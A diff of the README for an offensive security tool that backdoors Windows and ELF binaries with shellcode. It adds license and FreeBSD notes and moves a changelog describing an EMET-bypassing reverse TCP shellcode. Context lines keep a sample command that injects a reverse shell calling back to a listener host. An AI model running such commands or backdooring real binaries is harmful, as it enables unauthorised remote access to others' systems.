@@ -13,6 +13,8 @@ Contact the developer on:
     @midnite_runr
 
 
+Under a BSD 3 Clause License
+
 See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
 
 Dependences: 
@@ -33,31 +35,10 @@ UPDATE:
 
 ./update.sh
 
-
-7/13/2014 Changelog
-
-Incorporated Capstone: http://www.capstone-engine.org/
-
-During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.
-
-Renamed loadliba_reverse_tcp to iat_reverse_tcp.
-
-Small optimizations for speed.
-
-
-5/30/2014 Changelog
-
-Added a new win86 shellcode: loadliba_reverse_tcp
-    
-  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
-  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
-  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
-  - Bypasses EMET 4.1. The caller protection doesn't catch it.
-  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
-
 ---
 
-Supporting: Windows PE x86/x64 and Linux ELF x86/x64 (System V)
+Supporting: Windows PE x86/x64 and ELF x86/x64 (System V, FreeBSD)
+Experimental: FreeBSD x32
 
 Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.
 
@@ -265,3 +246,38 @@ Sample Usage:
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
 
     ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 
+
+---
+
+###Changelog
+
+7/22/2014 Changelog
+
+Added FreeBSD x32 ELF Patching Support
+
+Change to BSD 3 Clause License
+
+
+7/13/2014 Changelog
+
+Incorporated Capstone: http://www.capstone-engine.org/
+
+During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.
+
+Renamed loadliba_reverse_tcp to iat_reverse_tcp.
+
+Small optimizations for speed.
+
+
+5/30/2014 Changelog
+
+Added a new win86 shellcode: loadliba_reverse_tcp
+    
+  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
+  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
+  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
+  - Bypasses EMET 4.1. The caller protection doesn't catch it.
+  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
+
+---
+
